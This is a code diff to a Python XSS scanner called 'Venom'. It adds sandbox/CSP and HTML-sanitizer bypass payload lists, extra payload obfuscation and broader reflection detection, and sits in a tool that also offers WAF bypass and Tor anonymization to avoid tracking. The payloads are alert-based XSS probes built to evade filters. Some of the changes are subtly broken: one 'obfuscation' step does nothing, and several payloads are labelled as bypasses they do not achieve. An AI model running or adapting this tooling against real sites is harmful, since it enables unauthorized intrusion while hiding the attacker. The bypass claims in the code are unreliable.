@@ -99,14 +99,16 @@ def get_banner_and_features() -> str:
         f"{WHITE}{BOLD}Comprehensive parameter testing for XSS{RESET}",
         f"{WHITE}{BOLD}Enhanced endpoint discovery and crawling{RESET}",
         f"{WHITE}{BOLD}Anonymous operation mode with Tor or proxy support{RESET}",
-        f"{WHITE}{BOLD}IP anonymization to prevent tracking during scans{RESET}"
+        f"{WHITE}{BOLD}IP anonymization to prevent tracking during scans{RESET}",
+        f"{WHITE}{BOLD}Sandbox bypass with CSP and iframe evasion payloads{RESET}",
+        f"{WHITE}{BOLD}HTML sanitizer bypass with obscure tags and encodings{RESET}"
     ]
     return banner + "\n".join(f"{GREEN}●{RESET} {feature}" for feature in features) + "\n"
 
 def parse_args() -> argparse.Namespace:
     banner_and_features = get_banner_and_features()
     description = f"""{banner_and_features}
-Venom Advanced XSS Scanner is a tool for ethical penetration testers to detect XSS vulnerabilities. Version 5.48 supports over 8000 payloads, extended event handlers, AI-driven WAF/403 bypass, and enhanced subdomain scanning for both HTTP and HTTPS, considering 200 and 403 status codes as live.
+Venom Advanced XSS Scanner is a tool for ethical penetration testers to detect XSS vulnerabilities. Version 5.48 supports over 8000 payloads, extended event handlers, AI-driven WAF/403 bypass, sandbox and sanitizer bypasses, and enhanced subdomain scanning for both HTTP and HTTPS, considering 200 and 403 status codes as live.
 
 Usage:
   python3 venom.py <url> --scan-xss [options]
@@ -129,6 +131,8 @@ Options:
     --payload-file          Specific payload file to use.
     --use-403-bypass        Prioritize 403 bypass payloads.
     --extended-events       Use extended event handlers (e.g., onmouseover, onclick).
+    --bypass-sandbox        Enable payloads to bypass browser sandboxes or CSP (e.g., iframe, meta refresh).
+    --bypass-sanitizer      Enable payloads to bypass HTML sanitizers (e.g., DOMPurify, server-side filters).
     --extra-params          Additional parameters to test (e.g., 'email,id,search').
 
   Anonymity:
@@ -169,10 +173,11 @@ Examples:
     - AI-optimized scan with JSON report.
   python3 venom.py http://example.com --scan-xss --stealth --use-403-bypass --proxy socks5://localhost:9050
     - Stealth scan with 403 bypass via SOCKS5 proxy.
-  python3 venom.py https://app.com --scan-xss --subdomains subs.txt --extended-events --extra-params "email,search" --verbose
-    - Detailed scan with subdomains, extended events, and custom parameters.
+  python3 venom.py https://app.com --scan-xss --subdomains subs.txt --extended-events --bypass-sandbox --bypass-sanitizer --extra-params "email,search" --verbose
+    - Detailed scan with subdomains, extended events, sandbox/sanitizer bypasses, and custom parameters.
 
-Note: Use responsibly for authorized testing only.
+Note: legal disclaimer: Usage of venom for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
 """
     
     parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
@@ -197,6 +202,8 @@ Note: Use responsibly for authorized testing only.
     parser.add_argument("--new-session", action="store_true", help="Start a new session, clearing cookies.")
     parser.add_argument("--use-403-bypass", action="store_true", help="Prioritize 403 bypass payloads from 403bypass.txt.")
     parser.add_argument("--simulate-403", action="store_true", help="Simulate a 403 response to test bypass payloads.")
+    parser.add_argument("--bypass-sandbox", action="store_true", help="Enable payloads to bypass browser sandboxes or CSP (e.g., iframe, meta refresh).")
+    parser.add_argument("--bypass-sanitizer", action="store_true", help="Enable payloads to bypass HTML sanitizers (e.g., DOMPurify, server-side filters).")
     parser.add_argument("--no-live-status", action="store_true", help="Disable live status updates.")
     parser.add_argument("--anonymous", action="store_true", help="Run in anonymous mode: hide identifiable data and enforce IP anonymization via Tor/proxy.")
     parser.add_argument("--use-tor", action="store_true", help="Route traffic through Tor (requires Tor on port 9050).")
@@ -264,6 +271,10 @@ Note: Use responsibly for authorized testing only.
         print(f"{GREEN}[+] AI assistance enabled{RESET}")
     if args.extended_events:
         print(f"{GREEN}[+] Extended event handlers enabled{RESET}")
+    if args.bypass_sandbox:
+        print(f"{GREEN}[+] Sandbox bypass payloads enabled{RESET}")
+    if args.bypass_sanitizer:
+        print(f"{GREEN}[+] HTML sanitizer bypass payloads enabled{RESET}")
     if args.extra_params:
         print(f"{GREEN}[+] Extra parameters enabled: {args.extra_params}{RESET}")
     if args.subdomains:
@@ -278,19 +289,6 @@ Note: Use responsibly for authorized testing only.
     
     setup_logging(args.verbose, args.log_output, args.anonymous)
     return args
-
-# [Rest of the code remains identical to the previous version]
-# Including only parse_args above to focus on the -h update.
-# The following functions are unchanged:
-# - parse_post_file
-# - setup_tor_proxy
-# - setup_custom_proxy
-# - reset_tor_circuit
-# - AIAssistant class
-# - PayloadGenerator class
-# - Venom class
-# - is_reflected
-# - if __name__ == "__main__":
 
 def parse_post_file(file_path: str) -> tuple[Optional[str], Dict[str, str], Dict[str, str]]:
     url = None
@@ -357,11 +355,14 @@ def reset_tor_circuit():
         logging.error(f"Failed to reset Tor circuit: {e}")
 
 class AIAssistant:
-    def __init__(self, payloads: List[str], api_key: Optional[str] = None, platform: Optional[str] = None, extended_events: bool = False):
+    def __init__(self, payloads: List[str], api_key: Optional[str] = None, platform: Optional[str] = None, 
+                 extended_events: bool = False, bypass_sandbox: bool = False, bypass_sanitizer: bool = False):
         self.payloads = payloads
         self.api_key = api_key
         self.platform = platform
         self.extended_events = extended_events
+        self.bypass_sandbox = bypass_sandbox
+        self.bypass_sanitizer = bypass_sanitizer
         self.api_endpoint = self.get_api_endpoint() if platform else None
         self.success_history: Dict[str, dict] = {}
         self.lock = threading.Lock()
@@ -379,11 +380,11 @@ class AIAssistant:
         }
         return endpoints.get(self.platform, "https://api.xai.com/v1/completions")
 
-    def suggest_payloads(self, response: Optional[str] = None, status_code: int = 200, waf_detected: bool = False, waf_type: str = "Unknown") -> List[str]:
+    def suggest_payloads(self, response: Optional[str] = None, status_code: int = 200, 
+                        waf_detected: bool = False, waf_type: str = "Unknown") -> List[str]:
         executable_payloads = [p for p in self.payloads if any(x in p.lower() for x in ['alert(', 'on', 'confirm(', 'javascript:'])]
         other_payloads = [p for p in self.payloads if p not in executable_payloads]
         
-        # Prioritize basic XSS payloads
         basic_payloads = [
             "<script>alert('xss')</script>",
             "<img src=x onerror=alert('xss')>",
@@ -404,6 +405,22 @@ class AIAssistant:
             elif waf_type == "ModSecurity":
                 bypass_payloads.append("<script>/*foo*/alert('xss')/*bar*/</script>")
             return bypass_payloads + prioritized[:20]
+        
+        if self.bypass_sandbox:
+            sandbox_payloads = [
+                "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss')\">",
+                "<iframe srcdoc=\"<script>parent.alert('xss')</script>\">",
+                "<div id=window><script>window.alert('xss')</script></div>",
+            ]
+            prioritized = sandbox_payloads + prioritized
+        
+        if self.bypass_sanitizer:
+            sanitizer_payloads = [
+                "<isindex type=image src=1 onerror=alert('xss')>",
+                "<div onpointerrawupdate=alert('xss')>Hover</div>",
+                "<img src=x onerror=\"alert('xss')\">",
+            ]
+            prioritized = sanitizer_payloads + prioritized
         
         if not response:
             return prioritized + other_payloads[:20]
@@ -427,7 +444,7 @@ class AIAssistant:
             js_context = '<script' in response or 'javascript:' in response or 'onload' in response
             optimized = []
             if self.extended_events:
-                optimized = [p for p in sorted_payloads if (html_context and any(x in p.lower() for x in ['onmouseover', 'onclick', 'onerror'])) or 
+                optimized = [p for p in sorted_payloads if (html_context and any(x in p.lower() for x in ['onmouseover', 'onclick', 'onerror', 'onpointerrawupdate'])) or 
                             (js_context and any(x in p.lower() for x in ['alert(', 'confirm(']))]
             else:
                 optimized = [p for p in sorted_payloads if (html_context and 'on' in p.lower()) or (js_context and any(x in p.lower() for x in ['alert(', 'confirm(']))]
@@ -447,7 +464,8 @@ class AIAssistant:
 
 class PayloadGenerator:
     def __init__(self, payloads_dir: str, payload_file: Optional[str] = None, bypass_needed: bool = False, 
-                 use_403_bypass: bool = False, stealth: bool = False, extended_events: bool = False, waf_type: str = "Unknown"):
+                 use_403_bypass: bool = False, stealth: bool = False, extended_events: bool = False, 
+                 waf_type: str = "Unknown", bypass_sandbox: bool = False, bypass_sanitizer: bool = False):
         self.payloads_dir = payloads_dir
         self.payload_file = payload_file
         self.bypass_needed = bypass_needed
@@ -455,6 +473,8 @@ class PayloadGenerator:
         self.stealth = stealth
         self.extended_events = extended_events
         self.waf_type = waf_type
+        self.bypass_sandbox = bypass_sandbox
+        self.bypass_sanitizer = bypass_sanitizer
         self.payloads = self.load_payloads()
         self.previous_success = []
 
@@ -463,6 +483,20 @@ class PayloadGenerator:
             "<script>alert('xss')</script>",
             "<img src=x onerror=alert('xss')>",
             "javascript:alert('xss')"
+        ]
+        sandbox_bypass_payloads = [
+            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss')\">",
+            "<iframe srcdoc=\"<script>parent.alert('xss')</script>\">",
+            "<img src=x onfocus=alert('xss') autofocus>",
+            "<a href=\"javascript:alert('xss')\">Click</a>",
+            "<div id=window><script>window.alert('xss')</script></div>",
+        ]
+        sanitizer_bypass_payloads = [
+            "<isindex type=image src=1 onerror=alert('xss')>",
+            "<div onpointerrawupdate=alert('xss')>Hover</div>",
+            "<img src=x onerror=\"alert('xss')\">",
+            "<a href=\"jAvAsCrIpT:alert('xss')\">Link</a>",
+            "<input value=\"><script>alert('xss')</script>\" type=text>",
         ]
         bypass_payloads = {
             "Cloudflare": [
@@ -487,6 +521,15 @@ class PayloadGenerator:
         ]
 
         payloads = set(default_payloads if not self.stealth else stealth_payloads)
+        
+        if self.bypass_sandbox:
+            payloads.update(sandbox_bypass_payloads)
+            logging.info(f"Loaded {len(sandbox_bypass_payloads)} sandbox bypass payloads")
+        
+        if self.bypass_sanitizer:
+            payloads.update(sanitizer_bypass_payloads)
+            logging.info(f"Loaded {len(sanitizer_bypass_payloads)} HTML sanitizer bypass payloads")
+        
         if self.bypass_needed or self.use_403_bypass:
             waf_specific = bypass_payloads.get(self.waf_type, [])
             payloads.update(waf_specific)
@@ -553,9 +596,10 @@ class PayloadGenerator:
         return list(payloads)
 
     def generate(self) -> List[str]:
-        if self.bypass_needed:
-            return self.obfuscate_payloads(self.payloads)
-        return self.payloads
+        payloads = self.payloads
+        if self.bypass_needed or self.bypass_sandbox or self.bypass_sanitizer:
+            payloads = self.obfuscate_payloads(payloads)
+        return payloads
 
     def obfuscate_payloads(self, payloads: List[str]) -> List[str]:
         obfuscated = []
@@ -564,7 +608,10 @@ class PayloadGenerator:
                 p.upper(),
                 html.escape(p),
                 f"/*{random.randint(1,100)}*/{p}/*{random.randint(1,100)}*/",
-                urlencode({'': p})[1:]
+                urlencode({'': p})[1:],
+                ''.join(f"&#{ord(c)};" for c in p),
+                p.replace('script', 'scr' + 'ipt'),
+                f"javascript:{p}" if not p.startswith('javascript:') else p,
             ])
         return list(set(obfuscated))
 
@@ -590,7 +637,6 @@ class Venom:
             'Accept-Language': 'en-US,en;q=0.5'
         })
 
-        # Anonymity setup
         self.proxies = None
         if args.use_tor:
             setup_tor_proxy()
@@ -665,17 +711,18 @@ class Venom:
         self.initial_waf_ips_check()
         self.payload_generator = PayloadGenerator(
             self.args.payloads_dir, self.args.payload_file, self.bypass_performed, 
-            self.use_403_bypass, self.args.stealth, self.args.extended_events, self.waf_type
+            self.use_403_bypass, self.args.stealth, self.args.extended_events, 
+            self.waf_type, self.args.bypass_sandbox, self.args.bypass_sanitizer
         )
         self.payloads = self.payload_generator.generate()
         self.ai_assistant = AIAssistant(
-            self.payloads, self.args.ai_key, self.args.ai_platform, self.args.extended_events
+            self.payloads, self.args.ai_key, self.args.ai_platform, 
+            self.args.extended_events, self.args.bypass_sandbox, self.args.bypass_sanitizer
         ) if args.ai_assist else None
         if self.ai_assistant:
             self.payloads = self.ai_assistant.suggest_payloads(waf_detected=self.is_waf_detected, waf_type=self.waf_type)
         self.total_payloads = len(self.payloads)
 
-        # Signal handler for graceful exit
         signal.signal(signal.SIGINT, self.signal_handler)
 
     def signal_handler(self, sig, frame):
@@ -1189,8 +1236,20 @@ def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple
             for attr, value in tag.attrs.items():
                 if attr.startswith('on') and payload in str(value):
                     return True, f"Inside event handler ({attr})"
-                elif attr in ['href', 'src', 'data'] and 'javascript:' in value.lower() and payload in value:
+                elif attr in ['href', 'src', 'data', 'content'] and 'javascript:' in value.lower() and payload in value:
                     return True, f"Inside {attr} attribute (javascript:)"
+                elif attr == 'srcdoc' and payload in value:
+                    return True, "Inside iframe srcdoc (potential sandbox bypass)"
+
+        meta_tags = soup.find_all('meta', attrs={'http-equiv': 'refresh'})
+        for meta in meta_tags:
+            if payload in meta.get('content', ''):
+                return True, "Inside meta refresh (potential sandbox bypass)"
+
+        obscure_tags = ['isindex', 'keygen', 'base', 'input']
+        for tag in soup.find_all(obscure_tags):
+            if payload in str(tag):
+                return True, f"Inside {tag.name} tag (potential sanitizer bypass)"
 
         if any(c in payload for c in '<>"\'') and payload in response_text:
             return True, "Unescaped in HTML (potential injection)"
@@ -1199,7 +1258,8 @@ def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple
         return False, "Reflected but not executable"
 
     executable_patterns = [
-        r'alert\(.+\)', r'javascript:[^"]+', r'on[a-z]+\s*=\s*["\'][^"\']+["\']'
+        r'alert\(.+\)', r'javascript:[^"]+', r'on[a-z]+\s*=\s*["\'][^"\']+["\']',
+        r'srcdoc\s*=\s*["\'][^"\']+["\']', r'http-equiv\s*=\s*["\']refresh["\']'
     ]
     for pattern in executable_patterns:
         matches = re.findall(pattern, payload, re.IGNORECASE)
@@ -1213,8 +1273,13 @@ def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple
                     for attr, value in tag.attrs.items():
                         if attr.startswith('on') and match in str(value):
                             return True, f"Inside event handler ({attr}) (executable portion)"
-                        elif attr in ['href', 'src', 'data'] and 'javascript:' in value.lower() and match in value:
+                        elif attr in ['href', 'src', 'data', 'content', 'srcdoc'] and 'javascript:' in value.lower() and match in value:
                             return True, f"Inside {attr} attribute (javascript:) (executable portion)"
+                        elif attr == 'srcdoc' and match in value:
+                            return True, "Inside iframe srcdoc (executable portion)"
+                for tag in soup.find_all(['isindex', 'keygen', 'base', 'input']):
+                    if match in str(tag):
+                        return True, f"Inside {tag.name} tag (potential sanitizer bypass)"
                 if any(c in match for c in '<>"\'') and match in response_text:
                     return True, "Unescaped in HTML (executable portion)"
                 logging.debug(f"Executable portion '{match}' found but not in executable context")
